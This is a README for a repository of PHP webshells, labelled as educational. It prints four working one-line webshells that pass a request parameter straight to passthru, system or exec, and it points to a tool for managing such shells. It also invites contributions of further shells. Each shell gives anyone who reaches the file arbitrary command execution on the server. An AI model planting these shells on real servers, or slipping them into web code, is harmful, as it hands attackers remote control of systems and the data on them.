# php-webshells

Common PHP webshells. These are provided for education purposes only. __Do not put these on a publicly-accessible webserver.__ 

I recommend a one-liner and while not a full fledged webshell it works fine.

```php
<?php echo passthru($_GET['cmd']); ?>
```

You can try [WebHandler](https://github.com/lnxg33k/webhandler) to manage one-liners for POST and GET requests:

```php
    <?php system($_GET['cmd']); ?>
    <?php passthru($_REQUEST['cmd']); ?>
    <?php echo exec($_POST['cmd']); ?>
```

## Contributing

To contribute other shells not listed here:
1. Fork the [repo](https://github.com/JohnTroony/php-webshells)
2. Push the changes to your repo.
3. Make sure to include a simple description of your webshell.
4. Issue a Pull request.